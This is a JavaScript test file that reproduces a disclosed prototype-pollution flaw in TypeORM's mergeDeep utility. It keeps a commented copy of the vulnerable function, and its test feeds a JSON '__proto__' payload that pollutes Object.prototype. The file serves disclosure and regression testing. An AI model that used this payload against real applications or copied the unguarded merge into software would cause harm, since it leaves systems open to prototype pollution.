//https://hackerone.com/reports/869574

// function isObject(item) {
//   return item && typeof item === "object" && !Array.isArray(item);
// }
// const assert = require("assert");

// function mergeDeep(target, ...sources) {
//   if (!sources.length) return target;
//   const source = sources.shift();

//   if (isObject(target) && isObject(source)) {
//     for (const key in source) {
//       const value = source[key];
//       if (value instanceof Promise) continue;

//       if (
//         isObject(value) &&
//         !(value instanceof Map) &&
//         !(value instanceof Set) &&
//         !(value instanceof Date) &&
//         !(value instanceof Buffer) &&
//         !(value instanceof RegExp) &&
//         !(value instanceof URL)
//       ) {
//         if (!target[key])
//           Object.assign(target, {
//             [key]: Object.create(Object.getPrototypeOf(value)),
//           });
//         mergeDeep(target[key], value);
//       } else {
//         Object.assign(target, { [key]: value });
//       }
//     }
//   }

//   return mergeDeep(target, ...sources);
// }

test("prototype pollution in typeORM", () => {
  const util = require("typeorm/util/OrmUtils");
  const a = {};
  const b = JSON.parse(`{"__proto__":{"polluted":"yes"}}`);

  expect({}.polluted).toBe(undefined);

  util.OrmUtils.mergeDeep(a, b);
  expect({}.polluted).toBe("yes");
});
